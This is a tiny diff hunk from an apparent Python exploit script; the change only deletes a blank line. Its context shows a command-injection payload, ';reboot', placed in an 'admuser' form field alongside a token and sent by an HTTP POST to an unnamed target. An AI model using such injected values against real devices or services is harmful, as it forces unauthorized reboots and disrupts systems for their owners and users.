@@ -40,7 +40,6 @@ payload = ';reboot'
 data = {
     'tokenid': tokenid,
     'admuser': payload
-
 }
 
 r = requests.post(url, data)
